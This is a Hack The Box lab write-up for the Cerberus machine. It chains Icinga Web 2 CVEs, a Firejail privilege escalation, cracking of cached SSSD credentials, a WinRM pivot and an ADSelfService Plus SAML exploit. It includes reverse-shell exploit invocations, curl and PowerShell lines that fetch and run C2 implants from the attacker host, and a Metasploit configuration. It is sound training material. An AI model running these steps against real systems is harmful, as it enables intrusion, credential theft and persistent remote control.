---
title: "HTB • Cerberus"
tags:
  - "Advanced"
  - "Linux"
  - "Windows"
  - "Hard Difficulty"
  - "PHP"
  - "Web"
  - "Pivoting"
  - "WinRM"
  - "Active Directory"
  - "Hash Cracking"
  - "CVE"
  - "Command & Control"
excerpt: "Cerberus is a hard Windows machine on Hack the Box that involves CVEs, pivoting, hash cracking, and command & control"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-cerberus/"
---

Cerberus is a hard Windows machine created by [**TheCyberGeek**](https://app.hackthebox.com/users/114053) and [**TRX**](https://app.hackthebox.com/users/31190) on [**Hack The Box**](https://app.hackthebox.com/machines/Cerberus) that involves exploiting a couple of web CVEs to get a shell on a Linux host. We then exploit another CVE in **Firejail** to get full system control. Once we have full access, we can read the cached SSSD credentials which include an easily crackable hash for the user **matthew**. We are then able to login to the WinRM service on a connected domain controller for **cerberus.local** using matthew's account. The domain controller happens to host a vulnerable version of **ADSelfService Plus**, which leads us to full control of the domain controller when exploited.

## Initial Recon

We'll first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@red_team (bash)
rhost="10.10.11.205" # Target IP address
lhost="10.10.14.2" # Your VPN IP address
echo rhost=$rhost >> .env
echo lhost=$lhost >> .env
. ./.env && ctfscan $rhost
```
{:.nolineno}

There are a few open ports recognized:

| Transport | Port | Service | Product      | Version         |
|:----------|:-----|:--------|:-------------|:----------------|
| TCP       | 8080 | HTTP    | Apache httpd | 2.4.52 (Ubuntu) |
| UDP       | 53   | DNS     |              |                 |
| UDP       | 123  | NTP v3  |              |                 |

Although this is supposedly a Windows machine, it looks like the host listening on port 8080 is running **Ubuntu**.

## Linux Host

A standard GET request to the HTTP server on port **8080** returns a redirect to [/icingaweb2](http://10.10.11.205:8080/icingaweb2). Then when we visit that page in our browser, we are redirected to a login page for **Icinga Web 2**

![Icinga login](icinga-login.png)
_Icinga Web login page_

### Arbitrary File Disclosure

A quick exploit search with [searchsploit](https://www.exploit-db.com/searchsploit) leads us to **CVE-2022-24716**, an **Arbitrary File Disclosure** vulnerability affecting a wide range of Icinga Web 2 installations.

```bash
# bryan@red_team (bash)
searchsploit icinga web # Search for exploits applicable to Icinga Web 2
searchsploit -m 51329 # Copy EDB-ID:51329 to working directory
```
{:.nolineno}

This exploit seems to work right away without needing credentials!

```bash
# bryan@red_team (bash)
python3 51329.py "http://$rhost:8080/icingaweb2" /etc/passwd # Read /etc/passwd
```
{:.nolineno}

Knowing that we can read any files accessible by the web server's process, we begin to wonder...

- Does this software store credentials in a database?
- What database solution does this software use?
- Where might database credentials be stored?

To answer these questions, we visit [Icinga Web's documentation](https://icinga.com/docs/icinga-web/latest/doc/20-Advanced-Topics/#icinga-web-2-manual-configuration). It looks like the configuration files should be saved to the `/etc/icingaweb2`{:.filepath} directory, with the database configuration at `/etc/icingaweb2/resources.ini`{:.filepath}. Let's check out that database configuration and see what it stores.

```bash
# bryan@red_team (bash)
python3 51329.py "http://$rhost:8080/icingaweb2" /etc/icingaweb2/resources.ini
```
{:.nolineno}
>
```ini
[icingaweb2]
type = "db"
db = "mysql"
host = "localhost"
dbname = "icingaweb2"
username = "matthew"
password = "IcingaWebPassword2023"
use_ssl = "0"
```
{:file="/etc/icingaweb2/resources.ini"}

The file stores the username **`matthew`** and the password **`IcingaWebPassword2023`** for MySQL authentication. Although these credentials are meant for the database connection, we should check if they are reused for the web interface.

![Icinga dashboard](icinga-dashboard.png)
_Icinga Web dashboard_

Authentication is successful and we are redirected to the dashboard.

### Remote Code Execution

With a little more research into vulnerabilities in Icinga Web, we find [this GitHub security advisory](https://github.com/Icinga/icingaweb2/security/advisories/GHSA-v9mv-h52f-7g63).

>
CVE ID
: CVE-2022-2471
>
Affected versions
: <= 2.9.5
>
Impact
: Authenticated users, with access to the configuration, can create SSH resource files in unintended directories, leading to the execution of arbitrary code.

We look up the CVE ID in a standard search engine and find a few public exploits, but before we try any of them, we should verify that the installation is vulnerable by looking at the about page.

![Icinga about page](icinga-about.png)
_Icinga Web about page_

The about page reveals the version **2.9.2** which is indeed vulnerable.


#### Exploitation

Let's try to use [this exploit](https://github.com/JacobEbben/CVE-2022-24715/blob/b5429cf0444d45412dd5c9f629547ac6db0de1de/exploit.py) with the credentials we've gathered to receive a reverse shell on a [PwnCat](https://github.com/calebstewart/pwncat) listener.

```bash
# bryan@red_team (bash)
pwncat-cs -l $lhost 443
```
{:.nolineno}

```bash
# bryan@red_team (bash)
ssh-keygen -m pem -P "" -f dummy && rm dummy.pub # Create RSA private key
python3 exploit.py -t "http://$rhost:8080/icingaweb2" \
  -u "matthew" -p "IcingaWebPassword2023" \
  -e dummy -I $lhost -P 443 # send callback to our listener on port 443
```
{:.nolineno}

We successfully receive a callback and a reverse shell is established!

### Command & Control

At this point, we'll use [Sliver](https://github.com/BishopFox/sliver) to stabilize our shell and potentially pivot through any internal networks. You can find installation instructions for Sliver [here](https://github.com/BishopFox/sliver/wiki/Linux-Install-Script)


#### Implant Setup

Once Sliver is installed and the server is running, We'll establish a implant by creating a listener, generating and serving an implant executable, then running the implant on the target.

```bash
# bryan@red_team (sliver-client)
mtls -L 10.10.14.2 -l 443
generate -o linux -m 10.10.14.2:443 -G -l -s implant.elf
websites add-content -w cerberus -c implant.elf
https -L 10.10.14.2 -l 8443 -w cerberus
```
{:file="sliver-client.log" .nolineno}

```bash
# www-data@icinga (bash)
lhost="10.10.14.2" # Add HTTPS server host here (your HTB VPN address)
out=$(mktemp /tmp/im.XXXX) # We'll store the implant here
curl -ko $out https://$lhost:8443 # Download the implant from our HTTPS server
chmod +x $out && $out & # Execute the implant as a background job
```
{:.nolineno}

We'll just let the Sliver implant run in the background while we continue working with our main reverse shell session.

### Privilege Escalation

We come across an unusual SUID executable at `/usr/bin/firejail`{:.filepath} while doing some routine local enumeration. With a quick Google search, we find out that this executable belongs to a SUID sandbox program known as **Firejail**.


#### Firejail

As we search for FireJail exploits, we find [this publication](https://seclists.org/oss-sec/2022/q2/188) detailing a local privilege escalation vulnerability in **Firejail version 0.9.68**, and providing a [PoC program](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin). Let's check if the installation here is vulnerable.

```bash
# www-data@icinga (bash)
/usr/bin/firejail --version # "firejail version 0.9.68rc1" -> Vulnerable!
```
{:.nolineno}

The installation is vulnerable! Now we just download the exploit from [here](https://seclists.org/oss-sec/2022/q2/att-188/firejoin_py.bin), upload it to the target with PwnCat's upload feature, then use it to get elevated access.

```bash
# www-data@icinga (bash)
chmod +x firejoin.py && ./firejoin.py & # Run exploit
pid="" # PID from firejoin.py output here
firejail --join=$pid # Join sandbox
su - # Spawn root shell
```
{:.nolineno}


### Privileged Enumeration

Although we have unrestricted remote access to the Ubuntu machine, it isn't the Windows target we're looking for.


#### Network

Let's learn more about what the networking situation is.

```bash
# root@icinga (bash)
ip route # Look for assigned subnets
cat /etc/hosts # Look for named hosts
```
{:.nolineno}

We notice that this machine uses the router at **172.16.22.1** on the _eth0_ interface. This router address is also assigned the hostname **DC.cerberus.local** in `/etc/hosts`{:.filepath}, which leads us to believe that it's a domain controller under the domain **cerberus.local**. Let's see what open ports we can access on **172.16.22.1** by running a [static nmap build](https://github.com/bryanmcnulty/ctf-scripts/raw/main/bins/nmap_linux_amd64) on the target with [this list of common ports](https://raw.githubusercontent.com/bryanmcnulty/ctf-wordlists/main/ports/nmap-top-tcp-ports/nmap-ports-5000.txt).

```bash
# root@icinga (bash)
ip="172.16.22.1"
ports=$(cat nmap-ports-5000.txt | tr \\n , | sed s/,$//)
chmod +x nmap && ./nmap -v -p $ports --max-retries 1 --min-rate 200 172.16.22.1
```
{:.nolineno}

It looks like the only open and unfiltered port is **5985**, which is likely **WinRM**. We'll probably need credentials for an authorized account to use this service though. Regardless, we'll use Sliver to forward this port to localhost for later.

```bash
# bryan@red_team (sliver-client)
use
portfwd add -b 127.0.0.1:5985 -r 172.16.22.1:5985
```
{:file="sliver-client.log" .nolineno}


#### Processes

Let's search for any interesting processes.

```bash
# root@icinga (bash)
ps auxf | grep -v '^www-data' # List process tree without processes owned by www-data
```
{:.nolineno}

We spot an unusual reference to the domain noted earlier in a child process of `/usr/sbin/sssd`{:.filepath}.
>
```
/usr/sbin/sssd -i --logger=files
\_ /usr/libexec/sssd/sssd_be --domain cerberus.local --uid 0 --gid 0 --logger=files
\_ /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
\_ /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

A Google search for "sssd" produces the home page for this software at <https://sssd.io>, which advertises the following capabilities:

> Enroll your Linux machine into an Active Directory, FreeIPA or LDAP domain. Use remote identities, policies and various authentication and authorization mechanisms to access your computer.

It makes sense that it would be using the domain information because SSSD offers a way to access Active Directory authentication and authorization mechanisms from this machine. This also begs the question: does it cache Active Directory credentials? According to [this page](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sssd-cache-cred), it requires a certain configuration option in the configuration file at `/etc/sssd/sssd.conf`{:.filepath} called *cache_credentials*.

```ini
[sssd]
domains = cerberus.local
config_file_version = 2
services = nss, pam

[domain/cerberus.local]
default_shell = /bin/bash
ad_server = cerberus.local
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = CERBERUS.LOCAL
realmd_tags = manages-system joined-with-adcli
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = cerberus.local
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad
```
{:file="/etc/sssd/sssd.conf" .nolineno}

It appears that on this machine, SSSD actively caches domain credentials. Additionaly, We learn from [this guide](https://jfearn.fedorapeople.org/fdocs/en-US/Fedora_Draft_Documentation/0.1/html/System_Administrators_Guide/sssd-cache.html) that SSSD caches domain credentials separately in the `/var/lib/sss/db`{:.filepath} directory.

```bash
# root@icinga (bash)
ls -a /var/lib/sss/db # Found cache file: cache_cerberus.local.ldb
file="/var/lib/sss/db/cache_cerberus.local.ldb"
file $file # TDB database... Let's just do a strings dump
strings -n1 $file | grep -Ei 'pass|pw' # look for password labels -> "cachedPassword"
strings -n1 $file | grep 'cachedPassword$' -C 20 # look for cached passwords -> hash?
```
{:.nolineno}

We find `cache_cerberus.local.ldb`{:.filepath} in the cache directory, which contains three instances of the label _cachedPassword_ with a SHA-512 Crypt hash in a strings dump. There is also a label _name_ with "matthew@cerberus.local" in the nearby strings, so we assume that this hash belongs to the user _matthew_. Let's try cracking that hash with [John the Ripper](https://github.com/openwall/john).

```bash
# bryan@red_team (bash)
hash='$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0'
wordlist=~/wordlist/rockyou.txt # Use standard rockyou.txt wordlist
john --wordlist=$wordlist <(echo matthew:$hash) # Try to crack the hash
```
{:.nolineno}

We successfully recover the password **`147258369`**! Let's try using that on the domain controller's forwarded WinRM service with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

```bash
# bryan@red_team (bash)
evil-winrm -u matthew -p 147258369 -i localhost # Access WinRM from forwarded port 5985
```
{:.nolineno}

The authentication succeeds and we establish a pseudo-shell on the Windows host.

## Windows Host

First things first, we'll set up a Sliver implant on this host.

```bash
# bryan@red_team (sliver-client)
generate -e -l -m 10.10.14.2:443 -s implant.exe
websites add-content -w cerberus -c implant.exe
```
{:file="sliver-client.log" .nolineno}

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(new-object net.webclient).downloadfile("https://10.10.14.2:8443", "$env:temp\i.exe")
Start-Process "$env:temp\i.exe"
```
{:.nolineno}

### Services Enumeration

Now in our Sliver session we'll look for interesting open TCP ports.

```bash
# bryan@red_team (sliver-client)
netstat -T -l
```
{:file="sliver-client.log" .nolineno}
>
```
 Protocol   Local Address      Foreign Address   State    PID/Program Name
========== ================== ================= ======== ================================================
 tcp        0.0.0.0:80         0.0.0.0:0         LISTEN   4/System
 tcp        0.0.0.0:88         0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:135        0.0.0.0:0         LISTEN   968/svchost.exe
 tcp        0.0.0.0:389        0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:443        0.0.0.0:0         LISTEN   4/System
 tcp        0.0.0.0:445        0.0.0.0:0         LISTEN   4/System
 tcp        0.0.0.0:464        0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:593        0.0.0.0:0         LISTEN   968/svchost.exe
 tcp        0.0.0.0:636        0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:808        0.0.0.0:0         LISTEN   6100/Microsoft.IdentityServer.ServiceHost.exe
 tcp        0.0.0.0:1500       0.0.0.0:0         LISTEN   6100/Microsoft.IdentityServer.ServiceHost.exe
 tcp        0.0.0.0:1501       0.0.0.0:0         LISTEN   6100/Microsoft.IdentityServer.ServiceHost.exe
 tcp        0.0.0.0:2179       0.0.0.0:0         LISTEN   1960/vmms.exe
 tcp        0.0.0.0:3268       0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:3269       0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:5985       0.0.0.0:0         LISTEN   4/System
 tcp        0.0.0.0:8888       0.0.0.0:0         LISTEN   5016/java.exe
 tcp        0.0.0.0:9251       0.0.0.0:0         LISTEN   5016/java.exe
 tcp        0.0.0.0:9389       0.0.0.0:0         LISTEN   2308/Microsoft.ActiveDirectory.WebServices.exe
 tcp        0.0.0.0:47001      0.0.0.0:0         LISTEN   4/System
 tcp        0.0.0.0:49664      0.0.0.0:0         LISTEN   560/wininit.exe
 tcp        0.0.0.0:49665      0.0.0.0:0         LISTEN   1244/svchost.exe
 tcp        0.0.0.0:49666      0.0.0.0:0         LISTEN   1716/svchost.exe
 tcp        0.0.0.0:49667      0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:49691      0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:49693      0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:49695      0.0.0.0:0         LISTEN   708/lsass.exe
 tcp        0.0.0.0:49930      0.0.0.0:0         LISTEN   2744/dns.exe
 tcp        0.0.0.0:49931      0.0.0.0:0         LISTEN   672/services.exe
 tcp        0.0.0.0:49944      0.0.0.0:0         LISTEN   3060/certsrv.exe
 tcp        0.0.0.0:60182      0.0.0.0:0         LISTEN   2464/dfsrs.exe
 tcp        10.10.11.205:53    0.0.0.0:0         LISTEN   2744/dns.exe
 tcp        localhost:53       0.0.0.0:0         LISTEN   2744/dns.exe
 tcp        localhost:32000    0.0.0.0:0         LISTEN   1604/wrapper.exe
 tcp        localhost:33308    0.0.0.0:0         LISTEN   2372/postgres.exe
 tcp        localhost:49924    0.0.0.0:0         LISTEN   5016/java.exe
 tcp        172.16.22.1:53     0.0.0.0:0         LISTEN   2744/dns.exe
 tcp        172.16.22.1:139    0.0.0.0:0         LISTEN   4/System
```

A specific **java.exe** process is bound to ports **8888**, **9251**, and **49924**, which we find interesting since most of the services listed come by default on domain controllers. We find many references to a poduct called **ADSelfService** when searching the internet for software that uses port 9251.

### AD Self Service

We verify that ADSelfService is installed when we discover the installation folder at `C:\Program Files (x86)\ManageEngine\ADSelfService Plus`{:.filepath}. We also find out that the version is **6.2** from the installation's `README.html`{:.filepath}.

#### CVE-2022-47966

With a little help from CVEDetails, we find [this critical vulnerability](https://www.cvedetails.com/cve/CVE-2022-47966/) which affects the target's installed version and is known to have public exploits including a Metasploit module. The metasploit module in question has a couple of options that require some additional digging to find the appropriate values.

| Name       | Current Setting | Required | Description            |
|:-----------|:----------------|:---------|:-----------------------|
| GUID       |                 | Yes      | The SAML endpoint GUID |
| ISSUER_URL |                 | Yes      | The Issuer URL used by the Identity Provider which has been configured as the SAML authentication provider for the target server |

It looks like we need to forward ports **443** and **9251** to properly interact with the SSO service. The web servers on these ports also refer to the domain controller as **dc.cerberus.local** and **dc**, so we'll map those to our loopback address in `/etc/hosts`{:.filepath}

```bash
# bryan@red_team (sliver-client)
use
portfwd add -b 127.0.0.1:443 -r 127.0.0.1:443
portfwd add -b 127.0.0.1:9251 -r 127.0.0.1:9251
```
{:file="sliver-client.log" .nolineno}

```bash
# bryan@red_team (bash)
echo "127.0.0.1\tdc.cerberus.local dc" | sudo tee -a /etc/hosts
```
{:.nolineno}

Now we'll use [BurpSuite](https://portswigger.net/burp) with the [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) extension to observe the flow and hopefully find the correct values.

![SSO Login](sso-login.png)

The domain credentials for **matthew** should work here.

![SSO Credentials](sso-credentials.png)

The login is successful and we are directed back to the ADSelfService port. Looking through our HTTP history in BurpSuite, we find that the final SAML response has the values that we need.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
  Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified"
  Destination="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f"
  ID="_0d30cc5f-1972-47f8-aa73-3704afe6aefb"
  InResponseTo="_9711801b4e186dce7ba3a2de6b9f3592"
  IssueInstant="2023-07-29T16:17:05.946Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">http://dc.cerberus.local/adfs/services/trust</Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion ID="_4e69bcc9-9523-48e8-b5ac-579ddbe5d839"
    IssueInstant="2023-07-29T16:17:05.899Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
    <Issuer>http://dc.cerberus.local/adfs/services/trust</Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#_4e69bcc9-9523-48e8-b5ac-579ddbe5d839">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue>R09YQ5/OT7LQPVYxqBjDUjm64OpHE8rv1iMXIk1fu4A=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>GXdlZfjpoOEJE1OXknLEbPgPi2srJLSfLDaZs4GwOLMXQVOh2u0Pt4aHYpcRdFQ7/pdxY2cvGh06RCDp/FRpnDnv5IF0Ltuf99v/e05PInNOziB1PzuNFNP7xLulhUlfVGD1AoSMp6/OvOivADD9JkxiUPIjOWrz7isfX4V6mY0XSqiSRXDBwkOEWxPap2pAKCobPcbCPkF7S5pyd79Oa8rQSeTtToSASYoOLMR9+AvyBBUrlOqjldv7MJDug/sxJDAuixRsCZgD3biZI/gMDC9nxbWkD/KpodKPrZ9L/enT3A/sN/rPU8X4L+VomP178jJrrwdLSflKFdm/IcjKdg==</ds:SignatureValue>
      <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
        <ds:X509Data>
          <ds:X509Certificate>MIIC3jCCAcagAwIBAgIQJJkonjKavJxNAgwJep88RDANBgkqhkiG9w0BAQsFADArMSkwJwYDVQQDEyBBREZTIFNpZ25pbmcgLSBkYy5jZXJiZXJ1cy5sb2NhbDAeFw0yMzAxMzAxNDE4MjJaFw0yNDAxMzAxNDE4MjJaMCsxKTAnBgNVBAMTIEFERlMgU2lnbmluZyAtIGRjLmNlcmJlcnVzLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA5NP7HKKJe5baFkpL2a51DiABmkZJ3PHtEXT6ixuK5PefDFgKAOfFX01fRRu0DROKB7xXDtAZBGLYN2Yd6uELtuDoFtIKFRdGI7gqh34/vbcAxOZJVrNQO01fqEfcAWBMNIK5P/H4qFtAHlIy/kbJ6MfR59bPrSU6bPf+Ql5U5GmxuxkF523i8vGSVHw3H2VwdB8hbZOdWJghm5POCvzonohdvzV9b5SfKcaja0IN7uf46pdBKHnhFNOduZjCNWRQQFkpwDKmMl4xnrauhohwGbIU4D78x219EQ7QP3JPsBPa/hLTWcWGeD1Us8scL7e7jqmBHJG3ghRyU5dnmjhXxQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQDMDps3VUGQN1A8TQcnSR8ZsZyS2NgyvYvAuK6Vi5rgfQxdEbQJcLSLd0SV3EaHVLjj9oddsENEEMOpuBidK/b2rmgKbj/bzUK3A0BPlKvBAx9LrMRwpJMO+De2/gMQTshylu4Q4kdbP1O4eentzCupT41X3LRsc5E0L2P7kxnl4sCtqKstNt5iD+61Xvc57pmWGgNOiJC2KjqsJU8Hv/Z382W6KiEpV69s5d7wS6zaDzgO8RnqzLetn4V8RFs14jVxvuDtKzvN+CUTTb5mxEyNRgYO+5JlB5hSkCZDvn0cmgpYGpeN1v08HspxuhCWzqoT8dwwDwo33zdzsBq5QXYL</ds:X509Certificate>
        </ds:X509Data>
      </KeyInfo>
    </ds:Signature>
    <Subject>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData
          InResponseTo="_9711801b4e186dce7ba3a2de6b9f3592"
          NotOnOrAfter="2023-07-29T16:22:05.946Z" Recipient="https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-29T16:17:05.883Z" NotOnOrAfter="2023-07-29T17:17:05.883Z">
      <AudienceRestriction>
        <Audience>https://DC:9251/samlLogin/67a8d101690402dc6a6744b8fc8a7ca1acf88b2f</Audience>
      </AudienceRestriction>
    </Conditions>
    <AttributeStatement>
      <Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn">
        <AttributeValue>matthew@cerberus.local</AttributeValue>
      </Attribute>
    </AttributeStatement>
    <AuthnStatement AuthnInstant="2023-07-29T16:17:04.600Z">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
</samlp:Response>

```

GUID
: `67a8d101690402dc6a6744b8fc8a7ca1acf88b2f`

Issuer
: `http://dc.cerberus.local/adfs/services/trust`

#### Exploitation

Finally, we'll set the appropriate values in the exploit module and run the exploit!

```bash
# bryan@red_team (msfconsole)
use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
set rhosts 127.0.0.1
set target 0
set payload windows/x64/meterpreter/reverse_tcp_rc4
set lhost tun0
set lport 8000
set rc4password mryFnlywB9_N8gvc
set guid 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f
set issuer_url http://dc.cerberus.local/adfs/services/trust
exploit
```
{:.nolineno}

The exploit succeeeds and we establish a meterpreter session under the system context!